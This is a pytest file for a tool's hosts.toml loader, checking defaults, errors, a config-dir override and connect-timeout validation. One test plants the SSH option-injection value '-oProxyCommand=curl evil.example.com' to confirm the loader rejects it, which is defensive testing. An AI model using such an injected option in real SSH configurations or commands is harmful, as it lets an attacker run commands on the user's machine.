"""Tests for camp.host.config — the hosts.toml loader.

Test contract:
- A table declaring only its key resolves `ssh` to that key and `camp_bin` to
  the documented default ("camp").
- A table declaring `ssh` explicitly resolves to that value, not the table key.
- A table declaring `camp_bin` resolves to that path verbatim.
- Several tables load as several hosts, each keyed by its table name.
- An absent file loads as zero hosts and does not raise — distinct from an
  empty file, which also loads as zero hosts.
- Unparsable TOML raises the loader's own error type, and the message names
  the file.
- An unknown key inside a host table raises, naming the offending key —
  mutation-checked by removing the allowlist and confirming the test goes red.
- A non-string `ssh` or `camp_bin` raises rather than being carried through as
  a non-string into a later command line.
- CAMP_CONFIG_DIR points the loader at the overridden directory (it replaces
  the whole app dir; the file is at $CAMP_CONFIG_DIR/hosts.toml, not a nested
  camp/).
- An `ssh` value beginning with `-` raises, naming the host — such a value is
  placed by transport.py into the local `ssh` argv in OPTION position (e.g.
  `ssh = "-oProxyCommand=..."` is option injection), so it must never survive
  loading.

`connect_timeout_seconds` — the reserved top-level scalar bounding the SSH
handshake:
- An absent key returns the transport's own documented default.
- An explicit value returns that value.
- A non-numeric value, zero, a negative value, NaN, and +/-infinity each
  raise, naming the key — one test per shape.
- Malformed TOML fails the same way `load_hosts`'s malformed-file path
  fails (`HostConfigError`, not a traceback).
- An unrecognised top-level scalar sitting alongside `connect_timeout` does
  not stop `load_hosts` from loading the declared hosts — the document's top
  level tolerates an unknown key, so a camp that predates a future top-level
  addition is not broken by it either.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

_REPO_ROOT = Path(__file__).resolve().parents[3]
_PLUGIN_DIR = _REPO_ROOT / "tools" / "camp" / "plugins" / "camp"
if str(_PLUGIN_DIR) not in sys.path:
    sys.path.insert(0, str(_PLUGIN_DIR))

from camp.host.config import (  # noqa: E402
    HostConfigError,
    connect_timeout_seconds,
    load_hosts,
)
from camp.host.transport import DEFAULT_CONNECT_TIMEOUT_SECONDS  # noqa: E402


def _point_at(monkeypatch: pytest.MonkeyPatch, config_dir: Path) -> None:
    monkeypatch.setenv("CAMP_CONFIG_DIR", str(config_dir))


def _write_hosts(config_dir: Path, contents: str) -> Path:
    config_dir.mkdir(parents=True, exist_ok=True)
    hosts_file = config_dir / "hosts.toml"
    hosts_file.write_text(contents, encoding="utf-8")
    return hosts_file


def test_table_with_only_its_key_defaults_ssh_and_camp_bin(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(config_dir, "[hosts.andromeda]\n")

    hosts = load_hosts()

    assert hosts["andromeda"].ssh == "andromeda"
    assert hosts["andromeda"].camp_bin == "camp"


def test_explicit_ssh_overrides_the_table_key(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(
        config_dir,
        '[hosts.andromeda]\nssh = "andromeda.local"\n',
    )

    hosts = load_hosts()

    assert hosts["andromeda"].ssh == "andromeda.local"


def test_explicit_camp_bin_resolves_verbatim(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(
        config_dir,
        '[hosts.andromeda]\ncamp_bin = "/home/tom/.local/state/trailhead/bin/camp"\n',
    )

    hosts = load_hosts()

    assert hosts["andromeda"].camp_bin == "/home/tom/.local/state/trailhead/bin/camp"


def test_several_tables_load_as_several_hosts(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(
        config_dir,
        '[hosts.andromeda]\nssh = "andromeda.local"\n\n[hosts.orion]\ncamp_bin = "/opt/camp"\n',
    )

    hosts = load_hosts()

    assert set(hosts) == {"andromeda", "orion"}
    assert hosts["andromeda"].ssh == "andromeda.local"
    assert hosts["orion"].camp_bin == "/opt/camp"


def test_absent_file_loads_as_zero_hosts_without_raising(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    # config_dir itself does not even exist.

    hosts = load_hosts()

    assert hosts == {}


def test_empty_file_also_loads_as_zero_hosts(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(config_dir, "")

    hosts = load_hosts()

    assert hosts == {}


def test_unparsable_toml_raises_the_loaders_own_error_type_naming_the_file(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    hosts_file = _write_hosts(config_dir, "this is not [ valid toml")

    with pytest.raises(HostConfigError) as exc_info:
        load_hosts()

    assert str(hosts_file) in str(exc_info.value)


def test_unknown_key_in_a_host_table_raises_naming_the_key(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(
        config_dir,
        '[hosts.andromeda]\nssh = "andromeda"\nbogus_key = "nope"\n',
    )

    with pytest.raises(HostConfigError) as exc_info:
        load_hosts()

    assert "bogus_key" in str(exc_info.value)


def test_non_string_ssh_raises(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(config_dir, "[hosts.andromeda]\nssh = 42\n")

    with pytest.raises(HostConfigError):
        load_hosts()


def test_non_string_camp_bin_raises(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(config_dir, "[hosts.andromeda]\ncamp_bin = 7\n")

    with pytest.raises(HostConfigError):
        load_hosts()


def test_camp_config_dir_replaces_the_whole_app_dir_not_a_nested_camp(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    override_dir = tmp_path / "somewhere-else"
    monkeypatch.setenv("CAMP_CONFIG_DIR", str(override_dir))
    _write_hosts(override_dir, '[hosts.andromeda]\nssh = "andromeda"\n')

    hosts = load_hosts()

    # Proves the loader read from override_dir itself (not a nested
    # override_dir/camp/): a nested lookup would have found nothing and
    # loaded zero hosts instead of resolving "andromeda" here.
    assert hosts["andromeda"].ssh == "andromeda"


def test_ssh_value_beginning_with_dash_raises_naming_the_host(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(
        config_dir,
        '[hosts.andromeda]\nssh = "-oProxyCommand=curl evil.example.com"\n',
    )

    with pytest.raises(HostConfigError) as exc_info:
        load_hosts()

    assert "andromeda" in str(exc_info.value)


# ---------------------------------------------------------------------------
# connect_timeout_seconds — the reserved top-level scalar
# ---------------------------------------------------------------------------


def test_absent_connect_timeout_key_returns_the_transports_default(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(config_dir, "[hosts.andromeda]\n")

    assert connect_timeout_seconds() == DEFAULT_CONNECT_TIMEOUT_SECONDS


def test_explicit_connect_timeout_resolves_to_that_value(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(config_dir, "connect_timeout = 3\n[hosts.andromeda]\n")

    assert connect_timeout_seconds() == 3.0


def test_non_numeric_connect_timeout_raises_naming_the_key(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(config_dir, 'connect_timeout = "soon"\n')

    with pytest.raises(HostConfigError) as exc_info:
        connect_timeout_seconds()

    assert "connect_timeout" in str(exc_info.value)


def test_boolean_connect_timeout_raises_naming_the_key(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """`bool` is a subclass of `int` in Python, so `connect_timeout = true`
    must be refused explicitly rather than silently coercing to `1.0`."""
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(config_dir, "connect_timeout = true\n")

    with pytest.raises(HostConfigError) as exc_info:
        connect_timeout_seconds()

    assert "connect_timeout" in str(exc_info.value)


def test_zero_connect_timeout_raises_naming_the_key(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(config_dir, "connect_timeout = 0\n")

    with pytest.raises(HostConfigError) as exc_info:
        connect_timeout_seconds()

    assert "connect_timeout" in str(exc_info.value)


def test_negative_connect_timeout_raises_naming_the_key(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(config_dir, "connect_timeout = -5\n")

    with pytest.raises(HostConfigError) as exc_info:
        connect_timeout_seconds()

    assert "connect_timeout" in str(exc_info.value)


def test_nan_connect_timeout_raises_naming_the_key(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """`nan` compares false against both `> 0` and `<= 0`, so a bare
    positivity check lets it slide through untouched — it must still
    refuse, the same as any other non-positive value."""
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(config_dir, "connect_timeout = nan\n")

    with pytest.raises(HostConfigError) as exc_info:
        connect_timeout_seconds()

    assert "connect_timeout" in str(exc_info.value)


def test_infinite_connect_timeout_raises_naming_the_key(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """`inf` is positive, so it must be refused by a finiteness check
    rather than a bare positivity check — an infinite bound is not a
    connect timeout ssh can be handed."""
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(config_dir, "connect_timeout = inf\n")

    with pytest.raises(HostConfigError) as exc_info:
        connect_timeout_seconds()

    assert "connect_timeout" in str(exc_info.value)


def test_malformed_toml_fails_connect_timeout_seconds_the_same_way_load_hosts_fails(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    hosts_file = _write_hosts(config_dir, "this is not [ valid toml")

    with pytest.raises(HostConfigError) as exc_info:
        connect_timeout_seconds()

    assert str(hosts_file) in str(exc_info.value)


def test_unrecognised_top_level_key_does_not_block_load_hosts(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config_dir = tmp_path / "cfg"
    _point_at(monkeypatch, config_dir)
    _write_hosts(
        config_dir,
        'connect_timeout = 5\nsome_future_key = "unrecognised"\n[hosts.andromeda]\n',
    )

    hosts = load_hosts()

    assert hosts["andromeda"].ssh == "andromeda"
    assert connect_timeout_seconds() == 5.0
